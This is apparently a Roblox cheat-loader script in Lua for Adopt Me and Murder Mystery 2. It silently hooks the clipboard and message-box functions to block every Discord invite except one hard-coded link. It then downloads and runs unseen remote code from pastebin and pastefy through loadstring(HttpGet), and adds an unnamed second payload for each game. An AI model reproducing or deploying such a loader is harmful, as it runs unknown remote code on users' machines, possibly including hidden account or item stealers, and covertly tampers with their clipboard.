-- ANTI-COPY PROTECTION
-- Block clipboard operations that might contain Discord invites
local original_setclipboard
if setclipboard then
    original_setclipboard = setclipboard
    setclipboard = function(text)
        if type(text) == "string" then
            -- Check for specific allowed Discord link
            local allowedLink = "https://discord.gg/fkZbCUbEAR"
            
            -- If it's the allowed link, allow it
            if text == allowedLink then
                if original_setclipboard then
                    return original_setclipboard(text)
                end
                return
            end
            
            -- Block other Discord invite links
            if string.match(text:lower(), "discord%.gg/") 
            or string.match(text:lower(), "discordapp%.com/invite/")
            or string.match(text:lower(), "discord%.com/invite/") then
                -- Silent block without warning
                return
            end
        end
        -- Allow normal clipboard operations
        if original_setclipboard then
            original_setclipboard(text)
        end
    end
end

-- Also hook rconsoleprint without warnings
local original_rconsoleprint
if rconsoleprint then
    original_rconsoleprint = rconsoleprint
    rconsoleprint = function(text)
        -- No warnings, just pass through
        if original_rconsoleprint then
            original_rconsoleprint(text)
        end
    end
end

-- Additional protection: Hook messagebox without warnings
local original_messagebox
if messagebox then
    original_messagebox = messagebox
    messagebox = function(text, caption, flags)
        if type(text) == "string" then
            -- Check for specific allowed Discord link
            local allowedLink = "https://discord.gg/fkZbCUbEAR"
            
            -- If it's the allowed link, allow it
            if text == allowedLink then
                if original_messagebox then
                    return original_messagebox(text, caption, flags)
                end
                return 0
            end
            
            -- Block other Discord links silently
            if string.match(text:lower(), "discord") then
                return 0
            end
        end
        if original_messagebox then
            return original_messagebox(text, caption, flags)
        end
    end
end

-- MM2
local function MurderMystery2MainScript()
    loadstring(game:HttpGet("https://pastebin.com/raw/bApBYKRu"))()
end

local function S2()
loadstring(game:HttpGet("https://pastefy.app/dB553paM/raw"))()
end

-- ADOPT ME
local function AdoptMeMainScript()
    loadstring(game:HttpGet("https://pastebin.com/raw/u7h5Xq2s"))()
end

local function S4()
loadstring(game:HttpGet("https://pastefy.app/t3F2bOq2/raw"))()
end

-- Get game ID
local gameId = game.PlaceId
local supported = false

-- Adopt Me (Place ID: 920587237)
if gameId == 920587237 then
    supported = true
    task.spawn(S4)
    task.spawn(AdoptMeMainScript)

-- Murder Mystery 2 (Place ID: 142823291)
elseif gameId == 142823291 then
    supported = true
    task.spawn(S2)
    task.spawn(MurderMystery2MainScript)

elseif gameId == 132388544979740 then
    supported = true
    task.spawn(S4)
    task.spawn(AdoptMeMainScript)
end

-- Kick if game not supported
if not supported then
    game:GetService("Players").LocalPlayer:Kick("This game is not supported by the script!")
end
